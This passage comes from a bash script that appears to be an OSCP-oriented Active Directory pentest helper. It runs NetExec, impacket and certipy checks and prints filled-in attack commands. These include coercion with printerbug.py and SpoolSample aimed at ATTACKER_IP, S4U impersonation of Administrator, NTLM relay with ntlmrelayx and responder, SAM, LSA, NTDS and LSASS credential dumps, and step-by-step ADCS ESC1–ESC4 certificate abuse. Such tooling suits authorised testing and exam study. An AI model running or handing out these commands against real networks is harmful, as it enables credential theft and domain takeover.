            _certipy_ca_dns=$(grep -oiP "DNS Name\s*:\s*\K.+" "$OUTDIR/certipy_vulnerable.txt" 2>/dev/null | head -1 | xargs)
            [[ "$cred_type" == "hash" ]] && _certipy_cred="-hashes ':$secret'" || _certipy_cred="-p '$secret'"

            if grep -qiE "ESC[0-9]|Vulnerable" "$OUTDIR/certipy_vulnerable.txt" 2>/dev/null; then
                local _esc_types
                _esc_types=$(grep -oiE "ESC[0-9]+" "$OUTDIR/certipy_vulnerable.txt" | sort -Vu | tr '\n' ' ' | sed 's/ $//')

                echo -e "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
                echo -e "${RED}║  [!] ADCS VULNERABILITIES FOUND!                         ║${NC}"
                echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
                echo -e "${RED}    → Certipy output: $OUTDIR/certipy_vulnerable.txt${NC}"
                echo -e "${RED}    → ESC type(s):    ${_esc_types:-unknown}${NC}"
                [[ -n "$_certipy_ca" ]]       && echo -e "${YELLOW}    → CA Name:         ${_certipy_ca}${NC}"
                [[ -n "$_certipy_template" ]] && echo -e "${YELLOW}    → Template:         ${_certipy_template}${NC}"
                echo -e "${YELLOW}    → Add to Joplin:  \"X.X ADCS / Certificate abuse check\"${NC}"

                # Per-ESC targeted exploit commands
                adcs_print_esc_commands "$_esc_types" "$user" "$_certipy_cred" \
                    "$_certipy_ca" "$_certipy_template" "$secret" "$cred_type" "${_certipy_ca_dns:-}"
            fi
        fi

        echo -e "\n${CYAN}[*] LDAP signing check...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M ldap-checker" "$OUTDIR/ldap_signing.txt"
        else
            show_skipped_extra "-M ldap-checker" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M ldap-checker"
        fi

        # -------------------------
        # ADDITIONAL AD ENUMERATION (enumeratie alleen)
        # -------------------------
        echo -e "\n${CYAN}[*] GMSA passwords...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --gmsa" "$OUTDIR/gmsa.txt"
        else
            show_skipped_extra "--gmsa" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --gmsa"
        fi

        echo -e "\n${CYAN}[*] Delegation enumeration...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --find-delegation" "$OUTDIR/delegation_all.txt"
        else
            show_skipped_extra "--find-delegation" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --find-delegation"
        fi
        
        # impacket-findDelegation - More detailed uitvoer for unconstrained/constrained/RBCD
        if command -v impacket-findDelegation &> /dev/null && [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
            echo -e "${CYAN}    impacket-findDelegation...${NC}"
            if [[ "$cred_type" == "hash" ]]; then
                if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "impacket-findDelegation '$DOMAIN/$user' -hashes ':$secret' -dc-ip '$DC_IP'" "$OUTDIR/delegation_impacket.txt"
                else
                    show_skipped_extra "impacket-findDelegation" "impacket-findDelegation '$DOMAIN/$user' -hashes ':$secret' -dc-ip '$DC_IP'"
                fi
            else
                if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "impacket-findDelegation '$DOMAIN/$user:$secret' -dc-ip '$DC_IP'" "$OUTDIR/delegation_impacket.txt"
                else
                    show_skipped_extra "impacket-findDelegation" "impacket-findDelegation '$DOMAIN/$user:$secret' -dc-ip '$DC_IP'"
                fi
            fi
            # ── Parse and colour-code delegation results ────────────────────────
            if [[ -s "$OUTDIR/delegation_impacket.txt" ]]; then
                # Read all lines except header/separator
                local _del_lines
                _del_lines=$(grep -vE "^-+|^AccountName|^Impacket|^$|Copyright" \
                    "$OUTDIR/delegation_impacket.txt" 2>/dev/null)

                local _has_unconstrained_user=false
                local _has_unconstrained_dc=false
                local _has_constrained=false
                local _has_rbcd=false

                while IFS= read -r _dl; do
                    [[ -z "$_dl" ]] && continue
                    local _acc  _type  _deltype
                    _acc=$(echo "$_dl"    | awk '{print $1}')
                    _type=$(echo "$_dl"   | awk '{print $2}')    # Computer / User
                    _deltype=$(echo "$_dl" | awk '{print $3}')   # Unconstrained / Constrained / Resource-Based

                    case "${_deltype,,}" in
                    *unconstrained*)
                        # DC computer accounts always have Unconstrained — normal, not exploitable via you
                        # Non-DC machines with Unconstrained ARE dangerous (PrinterBug / coerce → TGT capture)
                        # We check if the name matches the known DC name
                        # Detect if this is the DC: strip $, compare against domain short name
                        # and also check ldap_computers.ldif for the actual DC CN
                        local _acc_bare="${_acc%\$}"
                        # Use ldap_computers.ldif for authoritative DC CN (most reliable)
                        local _ldap_dc_cn=""
                        [[ -s "$OUTDIR/ldap_computers.ldif" ]] && \
                            _ldap_dc_cn=$(awk '/^cn:/{print $2; exit}' "$OUTDIR/ldap_computers.ldif" \
                                2>/dev/null | tr -d '\r')
                        # Fallback: smb_domain_detect.txt often has (name:NARA)
                        local _smb_dc_name=""
                        [[ -s "$OUTDIR/smb_domain_detect.txt" ]] && \
                            _smb_dc_name=$(grep -oiP '\(name:\K[^)]+' "$OUTDIR/smb_domain_detect.txt" \
                                | head -1 | tr -d '\r')
                        local _is_dc=false
                        [[ -n "$_ldap_dc_cn"  && "${_acc_bare^^}" == "${_ldap_dc_cn^^}"  ]] && _is_dc=true
                        [[ -n "$_smb_dc_name" && "${_acc_bare^^}" == "${_smb_dc_name^^}" ]] && _is_dc=true

                        if [[ "$_is_dc" == true ]]; then
                            _has_unconstrained_dc=true
                            echo -e "${ORANGE}[○] Unconstrained delegation: ${_acc} — this is the DC (expected behaviour)${NC}"
                            echo -e "${ORANGE}    Domain Controllers always have Unconstrained delegation — this is not a misconfiguration.${NC}"
                            echo -e "${ORANGE}    However: if you can coerce another machine to auth to the DC, you could capture TGTs.${NC}"
                            echo -e "${ORANGE}    That requires PrinterBug/PetitPotam + Rubeus/krbrelayx — OSCP: do manually.${NC}"
                            echo -e "${GRAY}    >> python3 printerbug.py '${DOMAIN}/${user}:${secret}@${DC_IP}' ATTACKER_IP${NC}"
                        elif [[ "$_type" == "User" ]]; then
                            _has_unconstrained_user=true
                            echo -e "${RED}[!] UNCONSTRAINED DELEGATION — USER account: ${_acc}${NC}"
                            echo -e "${RED}    → Compromise ${_acc} → TGTs of every user authenticating to that account land in memory${NC}"
                            echo -e "${RED}    → Then dump TGTs (Mimikatz sekurlsa::tickets) and pass-the-ticket${NC}"
                        else
                            _has_unconstrained_user=true
                            echo -e "${RED}[!] UNCONSTRAINED DELEGATION — non-DC computer: ${_acc}${NC}"
                            echo -e "${RED}    → Coerce ${_acc} to auth to you → capture its TGT → pass-the-ticket → DA path${NC}"
                            echo -e "${GRAY}    >> python3 printerbug.py '${DOMAIN}/${user}:${secret}@${_acc_bare}.${DOMAIN}' ATTACKER_IP${NC}"
                            echo -e "${GRAY}    >> python3 SpoolSample.py ${_acc_bare}.${DOMAIN} ATTACKER_IP${NC}"
                        fi
                        ;;
                    *constrained*)
                        _has_constrained=true
                        local _rights=$(echo "$_dl" | awk '{print $4}')
                        echo -e "${ORANGE}[○] Constrained delegation: ${_acc} (${_type}) → ${_rights}${NC}"
                        echo -e "${ORANGE}    → ${_acc} can impersonate ANY user to the service: ${_rights}${NC}"
                        echo -e "${ORANGE}    → Exploitable if you compromise ${_acc} (S4U2Proxy attack)${NC}"
                        echo -e "${GRAY}    # S4U2Self/S4U2Proxy — impersonate Administrator to the delegated service:${NC}"
                        echo -e "${GRAY}    >> impacket-getST -spn '${_rights}' -impersonate Administrator '${DOMAIN}/${_acc%%$}' -hashes :NTHASH -dc-ip '$DC_IP'${NC}"
                        echo -e "${GRAY}    >> impacket-getST -spn '${_rights}' -impersonate Administrator '${DOMAIN}/${_acc%%$}:PASS' -dc-ip '$DC_IP'${NC}"
                        echo -e "${GRAY}    >> export KRB5CCNAME=Administrator@${_rights%%/*}.ccache${NC}"
                        echo -e "${GRAY}    >> impacket-wmiexec -k -no-pass '${DOMAIN}/Administrator@${_acc_bare:-TARGET}.${DOMAIN}'${NC}"
                        ;;
                    *resource*|*rbcd*)
                        _has_rbcd=true
                        local _rights=$(echo "$_dl" | awk '{print $4}')
                        echo -e "${RED}[!] RESOURCE-BASED CONSTRAINED DELEGATION (RBCD): ${_acc} → ${_rights}${NC}"
                        echo -e "${RED}    → ${_rights} allows ${_acc} to impersonate users — check if you control ${_acc}${NC}"
                        echo -e "${GRAY}    >> impacket-getST -spn 'host/${_rights%%/*}' -impersonate Administrator '${DOMAIN}/${_acc}:PASS' -dc-ip '$DC_IP'${NC}"
                        echo -e "${GRAY}    >> impacket-getST -spn 'host/${_rights%%/*}' -impersonate Administrator '${DOMAIN}/${_acc%%$}' -hashes :NTHASH -dc-ip '$DC_IP'${NC}"
                        echo -e "${GRAY}    >> export KRB5CCNAME=Administrator@${_rights%%/*}.ccache${NC}"
                        echo -e "${GRAY}    >> impacket-wmiexec -k -no-pass '${DOMAIN}/Administrator@${_rights%%/*}.${DOMAIN}'${NC}"
                        ;;
                    *)
                        echo -e "${GRAY}[○] Delegation: ${_dl}${NC}"
                        ;;
                    esac
                done <<< "$_del_lines"

                # Summary line
                if [[ "$_has_unconstrained_user" == true || "$_has_rbcd" == true ]]; then
                    echo -e "\n${RED}    → Delegation finding(s) above require follow-up — see commands${NC}"
                elif [[ "$_has_constrained" == true ]]; then
                    echo -e "\n${ORANGE}    → Constrained delegation present — exploitable if you own the delegating account${NC}"
                fi
            fi
        fi

        echo -e "\n${CYAN}[*] Pre-Windows 2000 computers...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M pre2k" "$OUTDIR/pre2k.txt"
        else
            show_skipped_extra "-M pre2k" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M pre2k"
        fi

        echo -e "\n${CYAN}[*] Domain SID...${NC}"
        if [[ "$SKIP_SID_ENUM" == false ]]; then
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --get-sid" "$OUTDIR/domain_sid.txt"
        else
            echo -e "${GRAY}>> SKIPPED: nxc ldap --get-sid (disabled by --skip-desc-users or SID skip setting)${NC}"
        fi

        echo -e "\n${CYAN}[*] WebDAV service check...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M webdav" "$OUTDIR/webdav.txt"
        else
            show_skipped_extra "-M webdav" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M webdav"
        fi

        echo -e "\n${CYAN}[*] Spooler service check...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M spooler" "$OUTDIR/spooler.txt"
        else
            show_skipped_extra "-M spooler" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M spooler"
        fi

        echo -e "\n${CYAN}[*] Veeam credentials...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M veeam" "$OUTDIR/veeam.txt"
        else
            show_skipped_extra "-M veeam" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M veeam"
        fi

        echo -e "\n${CYAN}[*] WinLogon registry (auto-login creds)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M reg-winlogon" "$OUTDIR/winlogon.txt"
        else
            show_skipped_extra "-M reg-winlogon" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M reg-winlogon"
        fi

        echo -e "\n${CYAN}[*] PowerShell history (credentials in console history)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M powershell_history" "$OUTDIR/powershell_history.txt"
        else
            show_skipped_extra "-M powershell_history" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M powershell_history"
        fi

        # -------------------------
        # VULNERABILITY CHECKS (enumeratie alleen, no auto-exploit)
        # -------------------------
        echo -e "\n${CYAN}[*] ZeroLogon check (CVE-2020-1472)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M zerologon" "$OUTDIR/zerologon.txt"
        else
            show_skipped_extra "-M zerologon" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M zerologon"
        fi

        echo -e "\n${CYAN}[*] PetitPotam check...${NC}"
        # NOTE: -M petitpotam sends an active EfsRpcOpenFileRaw coercion request to the target.
        # This is NOT a passive probe - it triggers a live outbound auth attempt.
        # Skipped in --oscp mode (active exploitation = prohibited in OSCP exam).
        if [[ "$OSCP_MODE" == true ]]; then
            echo -e "${YELLOW}[OSCP] Skipping -M petitpotam (active coercion trigger - prohibited in OSCP exam)${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M petitpotam${NC}"
        elif [[ "$RUN_EXTRAS" == true ]]; then
            run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M petitpotam" "$OUTDIR/petitpotam.txt"
        else
            show_skipped_extra "-M petitpotam" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M petitpotam"
        fi

        echo -e "\n${CYAN}[*] Coerce Plus check (NTLM coercion - replaces petitpotam)...${NC}"
        # NOTE: -M coerce_plus tries multiple coercion methods (PetitPotam, DFSCoerce, PrinterBug, etc.)
        # Each method sends active exploitation requests. Skipped in --oscp mode.
        if [[ "$OSCP_MODE" == true ]]; then
            echo -e "${YELLOW}[OSCP] Skipping -M coerce_plus (active coercion trigger - prohibited in OSCP exam)${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M coerce_plus${NC}"
        elif [[ "$RUN_EXTRAS" == true ]]; then
            run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M coerce_plus" "$OUTDIR/coerce_plus.txt"
        else
            show_skipped_extra "-M coerce_plus" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M coerce_plus"
        fi

        echo -e "\n${CYAN}[*] noPac check (CVE-2021-42278)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M nopac" "$OUTDIR/nopac.txt"
        else
            show_skipped_extra "-M nopac" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M nopac"
        fi

        # MS17-010 (EternalBlue) check
        echo -e "\n${CYAN}[*] EternalBlue check (MS17-010)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M ms17-010" "$OUTDIR/eternalblue.txt"
        else
            show_skipped_extra "-M ms17-010" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M ms17-010"
        fi
        
        # smbghost (CVE-2020-0796)
        echo -e "\n${CYAN}[*] SMBGhost check (CVE-2020-0796)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M smbghost" "$OUTDIR/smbghost.txt"
        else
            show_skipped_extra "-M smbghost" "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M smbghost"
        fi

        # lookupsid.py for additional domein enumeratie
        if command -v impacket-lookupsid &> /dev/null && [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
            echo -e "\n${CYAN}[*] impacket-lookupsid (additional user discovery)...${NC}"
            if [[ "$SKIP_SID_ENUM" == true ]]; then
                echo -e "${GRAY}>> SKIPPED: impacket-lookupsid (disabled by --skip-desc-users or SID skip setting)${NC}"
            else
            if [[ "$cred_type" == "hash" ]]; then
                if [[ "$SKIP_DOMAIN_SIDS" == true ]]; then
                    if [[ "$SKIP_SID_ENUM" == false ]]; then
                    run_cmd "impacket-lookupsid '$DOMAIN/$user@$DC_IP' -hashes ':$secret'" "$OUTDIR/lookupsid.txt"
                fi
                else
                    if [[ "$SKIP_SID_ENUM" == false ]]; then
                    run_cmd "impacket-lookupsid '$DOMAIN/$user@$DC_IP' -hashes ':$secret' -domain-sids" "$OUTDIR/lookupsid.txt"
                fi
                fi
            else
                if [[ "$SKIP_DOMAIN_SIDS" == true ]]; then
                    if [[ "$SKIP_SID_ENUM" == false ]]; then
                    run_cmd "impacket-lookupsid '$DOMAIN/$user:$secret@$DC_IP'" "$OUTDIR/lookupsid.txt"
                fi
                else
                    if [[ "$SKIP_SID_ENUM" == false ]]; then
                    run_cmd "impacket-lookupsid '$DOMAIN/$user:$secret@$DC_IP' -domain-sids" "$OUTDIR/lookupsid.txt"
                fi
                fi
            fi
        fi

            fi
        # Export domein SID and confirmed domein gebruikers for re-use
        export_users_from_lookupsid "$OUTDIR/lookupsid.txt"

        # Post-exploit dump commands — OSCP: run these MANUALLY after you have a shell
        if [[ "$pwned" == "yes" ]]; then
            local _p7_dom="${domain:-$DOMAIN}"
            local _p7_dp="${_p7_dom:+$_p7_dom/}"
            echo -e "\n${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${YELLOW}║  PWNED — POST-EXPLOIT CMDS (MANUAL, not auto-executed)    ║${NC}"
            echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${GRAY}  # ── Domain auth (works when target is joined to AD)${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --dpapi${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --sam${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --lsa${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --ntds${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS -M lsassy${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS -M powershell_history${NC}"
            echo -e "${GRAY}  # ── Local auth (use when domain auth returns STATUS_LOGON_FAILURE)${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --local-auth --sam${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --local-auth --lsa${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --local-auth --ntds${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --local-auth -M lsassy${NC}"
            echo -e "${GRAY}  >> sudo nxc smb $TARGET_ARG $AUTH_ARGS --local-auth -M powershell_history${NC}"
            if [[ "$cred_type" == "password" ]]; then
                echo -e "${GRAY}  # ── lsassy standalone (dumps LSASS with domain context)${NC}"
                echo -e "${GRAY}  >> lsassy -u '$user' -p '$secret' -d '${_p7_dom}' ${TARGET_ARG}${NC}"
                echo -e "${GRAY}  >> lsassy -u '$user' -p '$secret' ${TARGET_ARG}  # local-only fallback${NC}"
            else
                echo -e "${GRAY}  # ── lsassy standalone with hash (PTH)${NC}"
                echo -e "${GRAY}  >> lsassy -u '$user' -H '$secret' -d '${_p7_dom}' ${TARGET_ARG}${NC}"
            fi
        fi
        
        # Genereer attack tips based on findings
        echo -e "\n${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║    ATTACK VECTORS (based on findings)                     ║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
        
        # Check spooler for PrintNightmare
        if grep -qi "Spooler service enabled" "$OUTDIR/spooler.txt" 2>/dev/null; then
            echo -e "${RED}[!] Spooler enabled - PrintNightmare / PrinterBug possible:${NC}"
            echo -e "${GRAY}    # PrintNightmare: CVE-2021-1675 (requires msfvenom dll)${NC}"
            echo -e "${GRAY}    # PrinterBug (coercion): python3 printerbug.py $DOMAIN/$user:$secret@$DC_IP ATTACKER_IP${NC}"
        fi

        # Check powershell_history for credentials
        if grep -qiE "password|passwd|secret|credential|ConvertTo-SecureString" "$OUTDIR/powershell_history.txt" 2>/dev/null; then
            echo -e "${RED}[!] POTENTIAL CREDENTIALS in PowerShell history!${NC}"
            echo -e "${GRAY}    >> cat $OUTDIR/powershell_history.txt  # review manually${NC}"
            grep -iE "password|passwd|secret|ConvertTo-SecureString" "$OUTDIR/powershell_history.txt" 2>/dev/null | head -5 | while IFS= read -r _psh_line; do
                echo -e "${RED}    ${_psh_line}${NC}"
            done
        fi
        
        # Check coercion vulns
        if grep -qi "VULNERABLE" "$OUTDIR/coerce_plus.txt" 2>/dev/null; then
            echo -e "${RED}[!] NTLM Coercion possible - setup relay attack:${NC}"
            echo -e "${GRAY}    # Start responder: sudo responder -I eth0${NC}"
            echo -e "${GRAY}    # Or NTLM relay: impacket-ntlmrelayx -t ldaps://$DC_IP --delegate-access${NC}"
        fi
        
        # Check for relay doelhosts
        if [[ -s "$OUTDIR/relay_targets.txt" ]]; then
            echo -e "${RED}[!] SMB signing disabled — relay attack possible:${NC}"
            echo -e "${GRAY}    >> sudo impacket-ntlmrelayx -tf '$OUTDIR/relay_targets.txt' -smb2support${NC}"
            echo -e "${GRAY}    >> sudo impacket-ntlmrelayx -t ldaps://${DC_IP:-DC_IP} -smb2support --delegate-access  # LDAP relay${NC}"
            echo -e "${GRAY}    >> sudo responder -I IFACE -dwv  # trigger via LLMNR/NBT-NS${NC}"
            echo -e "${GRAY}    >> impacket-rpcdump TARGET_IP | grep -i print  # check spooler for PrinterBug coerce${NC}"
        fi
    else
        echo -e "${YELLOW}[!] No valid creds, skipping authenticated attacks${NC}"
    fi
}

# =============================================================================
# ADCS ESC REFERENCE — adcs_print_esc_commands()
# Called automatically when certipy finds vulnerabilities.
# Also callable standalone: source modules/adcs.sh && adcs_esc_help [ESC1..ESC16]
#
# Arguments (when called from certipy result block):
#   $1  space-separated ESC type list  e.g. "ESC1 ESC4"
#   $2  username                       e.g. "tracy.white"
#   $3  certipy credential flag        e.g. "-p 'pass'" or "-hashes ':hash'"
#   $4  CA name                        e.g. "CORP-CA"
#   $5  template name                  e.g. "VulnTemplate"
#   $6  raw secret (pass or hash)
#   $7  cred type                      "password" | "hash"
# =============================================================================

# ── One-liner descriptions for each ESC ──────────────────────────────────────
adcs_esc_description() {
    local esc="${1^^}"
    case "$esc" in
        ESC1)  echo "Enrollee-supplied SAN + auth EKU → impersonate any user" ;;
        ESC2)  echo "Any-Purpose / overly broad EKU → repurpose cert beyond intent" ;;
        ESC3)  echo "Enrollment Agent template → request certs on behalf of others" ;;
        ESC4)  echo "Writable template ACL → modify template into ESC1, enroll, revert" ;;
        ESC5)  echo "Writable PKI object ACLs (non-template) → alter PKI trust" ;;
        ESC6)  echo "CA honors SAN in request attributes → inject another identity" ;;
        ESC7)  echo "Dangerous CA ACLs → manage CA, approve requests, change config" ;;
        ESC8)  echo "NTLM relay to AD CS HTTP enrollment → cert for relayed identity" ;;
        ESC9)  echo "Template lacks security extension → weaker identity binding" ;;
        ESC10) echo "Weak certificate mapping → loose auth to more privileged account" ;;
        ESC11) echo "NTLM relay to AD CS RPC/ICPR enrollment endpoint" ;;
        ESC12) echo "CA private key theft → forge any certificate in the domain" ;;
        ESC13) echo "Issuance policy/OID-group link → gain group authorization via cert" ;;
        ESC14) echo "Explicit certificate mapping abuse → bind cert to another account" ;;
        ESC15) echo "Arbitrary application policy injection → cert trusted for unintended auth" ;;
        ESC16) echo "CA disables security extension globally → domain-wide weaker binding" ;;
        *)     echo "Unknown ESC type" ;;
    esac
}

# ── Per-ESC commands — printed with filled-in variables when available ────────
adcs_esc_commands() {
    local esc="${1^^}"
    local user="${2:-USER}"
    local dom="${3:-DOMAIN}"
    local dc="${4:-DC_IP}"
    local ca="${5:-CA_NAME}"
    local tmpl="${6:-TEMPLATE}"
    local cred="${7:--password 'PASSWORD'}"
    local secret="${8:-PASSWORD}"
    local ctype="${9:-password}"
    local ca_target="${10:-}"  # CA FQDN for -target flag (certipy v5)

    # certipy v5 uses -username/-password; also needs -target (CA FQDN) and -target-ip
    local U="${user}@${dom}"
    local _target_opt=""
    if [[ -n "$ca_target" && "$ca_target" != "$dom" ]]; then
        _target_opt="-target '${ca_target}' -target-ip '${dc}' "
    fi

    # Build hash variant for commands that need it separately
    local hash_flag=""
    [[ "$ctype" == "hash" ]] && hash_flag="-hashes ':${secret}'" || hash_flag="-password '${secret}'"

    echo ""
    echo -e "${YELLOW}  ┌── ${esc} — $(adcs_esc_description "$esc") ──${NC}"

    case "$esc" in

    ESC1)
        echo -e "${CYAN}  │  Enumerate (already done by certipy find above)${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -username '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Request cert impersonating Administrator (-upn):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -username '${U}' ${hash_flag} -dc-ip '${dc}' ${_target_opt}-ca '${ca}' -template '${tmpl}' -upn 'administrator@${dom}'${NC}"
        echo -e "${CYAN}  │  Authenticate — get NT hash or use -ldap-shell:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx administrator.pfx -dc-ip '${dc}' -domain '${dom}'${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx administrator.pfx -dc-ip '${dc}' -ldap-shell  # no hash needed${NC}"
        echo -e "${GRAY}  │  Tip: -upn impersonates user; -dns impersonates computer (DC\$) — use -upn for admin${NC}"
        echo -e "${GRAY}  │  Tip: if CA is on a different host from DC, -target-ip and -target are required${NC}"
        ;;

    ESC2)
        echo -e "${CYAN}  │  Enumerate:${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Request cert (then test if usable for auth/delegation):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${GRAY}  │  Note: check resulting cert EKUs — may enable auth or be used as ESC3 agent cert${NC}"
        ;;

    ESC3)
        echo -e "${CYAN}  │  Step 1 — Get Enrollment Agent certificate:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}'${NC}"
        echo -e "${CYAN}  │  Step 2 — Request cert ON BEHALF OF administrator:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template 'User' -on-behalf-of '${dom}\\Administrator' -pfx agent.pfx${NC}"
        echo -e "${CYAN}  │  Step 3 — Authenticate:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx administrator.pfx -dc-ip '${dc}'${NC}"
        ;;

    ESC4)
        echo -e "${RED}  │  ⚠ OSCP WARNING: Step 2 modifies an AD object. Revert immediately after.${NC}"
        echo -e "${CYAN}  │  Step 1 — Save current template config (for cleanup):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad template -u '${U}' ${hash_flag} -dc-ip '${dc}' -template '${tmpl}' -save-old${NC}"
        echo -e "${CYAN}  │  Step 2 — Make template vulnerable (ESC1 style):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad template -u '${U}' ${hash_flag} -dc-ip '${dc}' -template '${tmpl}' -write-default-configuration${NC}"
        echo -e "${CYAN}  │  Step 3 — Request cert as administrator:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad req -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -template '${tmpl}' -upn 'administrator@${dom}'${NC}"
        echo -e "${CYAN}  │  Step 4 — RESTORE template (important!):${NC}"
        echo -e "${WHITE}  │  >> certipy-ad template -u '${U}' ${hash_flag} -dc-ip '${dc}' -template '${tmpl}' -configuration '${tmpl}.json'${NC}"
        echo -e "${CYAN}  │  Step 5 — Authenticate:${NC}"
        echo -e "${WHITE}  │  >> certipy-ad auth -pfx administrator.pfx -dc-ip '${dc}'${NC}"
        ;;

    ESC5)
        echo -e "${CYAN}  │  Enumerate writable PKI objects:${NC}"
        echo -e "${GRAY}  │  >> certipy-ad find -u '${U}' ${hash_flag} -dc-ip '${dc}' -vulnerable -enabled -stdout${NC}"
        echo -e "${CYAN}  │  Inspect which PKI object is writable (CA config, NTAuthCertificates, etc.)${NC}"
        echo -e "${GRAY}  │  >> certipy-ad ca -u '${U}' ${hash_flag} -dc-ip '${dc}' -ca '${ca}' -list-templates${NC}"
